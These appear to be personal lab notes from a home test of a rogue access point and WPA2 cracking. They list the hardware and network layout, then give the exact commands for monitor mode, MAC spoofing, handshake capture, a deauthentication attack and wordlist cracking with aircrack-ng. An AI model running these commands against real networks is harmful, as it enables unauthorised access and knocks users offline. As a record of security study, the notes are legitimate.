### Rogue AP and Wi-Fi Cracking

#### Descriptions of Test Environment

* **Date**: 09/04/2023

* **Hardware Involved**:
  
  * Raspberry Pi (Ubuntu Server) with BrosTrend AC5L USB Wireless adapter
  
  * Dell XPS 13 (Arch Linux)
  
  * Dell XPS 8940 (Arch Linux) with BrosTrend AC5L USB Wireless adapter
  
  * ARRIS Group, Inc TG3482G Wireless router/gateway

* **Network Topology**:
  
  * **Router**
    
    * Xfinity Router (ARRIS Group TG3482G)
    
    * SSID: "Home"
    
    * Subnet Mask: 255.255.255.0
    
    * MAC: 14:C0:3E:92:AC:2E
  
  * **Desktop (Arch Linux)**
    
    * Built-in wireless interface (wlo1)
      
      * Connected to "Home" network
      
      * IP address: 10.0.0.92
      
      * MAC: 34:C9:3D:00:55:73
    
    * USB Wireless Interface (wlp0s20f0u4)
      
      * Not connected to any network
      
      * Intended for packet capturing and de-auth attack
      
      * MAC: E6:1E:1A:83:79:35
  
  * **Raspberry PI**
    
    * Built-in Wireless Interface (wlan0)
      
      * Connected to "Home" network
      
      * IP Address: 10.0.0.189
      
      * MAC: dc:A6:32:C9:F7:1F
    
    * USB Wireless Interface (wlan1)
      
      * AP Mode
      
      * Broadcasting network "uuoouu"
      
      * IP Address: 192.168.1.1
      
      * Subnet mask: 255.255.255.0
      
      * MAC: 34:7D:E4:40:19:C7
  
  * **Laptop (Arch Linux)**
    
    * Connected to the "uuoouu" network
    
    * IP Address: 192.168.1.207
    
    * 9C:B6:D0:99:DE:F7

#### Actions Taken

**Raspberry Pi**

* Ran rogue_ap.sh script:
  `./rogue_ap.sh wlan0 wlan1 192.168.1.1 255.255.255.0 "uuoouu" -p [pwd]`

**Laptop**

* Connected laptop to the "uuoouu" network

* Started continuous ping
  `ping -c 10000 google.com`

**Desktop**

* Put wlp0s20f0u4 into monitor mode and change MAC address
  
  ```bash
  sudo ip link set wlp0s20f0u4 down
  sudo ip link set dev wlp0s20f0u4 address 12:34:56:78:9a:bc
  sudo iw dev wlp0s20f0u4 set type monitor
  sudo ip link set wlp0s20f0u4 up
  ```

* Initiate wireless network scan on the interface wlp0s20f0u4 with airodump
   `sudo airodump-ng wlp0s20f0u4`

* Captured:
  
  * ESSID: uuoouu
  
  * AUTH: PSK
  
  * CIPHER: CCMP
  
  * ENC: WPA2
  
  * MB: 54
  
  * CH: 7
  
  * #/s: 0
  
  * #Data: 2
  
  * Beacons: 8
  
  * PWR: -47
  
  * BSSID: 34:7D:E4:40:19:C7

* Start capture on target and direct captured data to file capture_output
  `sudo airodump-ng -c 7 --bssid 34:7D:E4:40:19:C7 -w capture_output wlp0s20f0u4`

* In other terminal, perform the de-auth attack
  `sudo aireplay-ng --deauth 10 -a 34:7D:E4:40:19:C7 -c [optional client MAC] wlp0s20f0u4`

* Analyze capture with aircrack-ng - The output will indicate if a handshake was captured
  `aircrack-ng capture-output-01.cap`

* Attempt to crack password by providing wordlist
  `aircrack-ng -w <path to wordlist> capture_output-01.cap`

* Success!
  ![cracked](/home/arbegla/projects/notes/wifi_cracking/cracked_pwd.png)
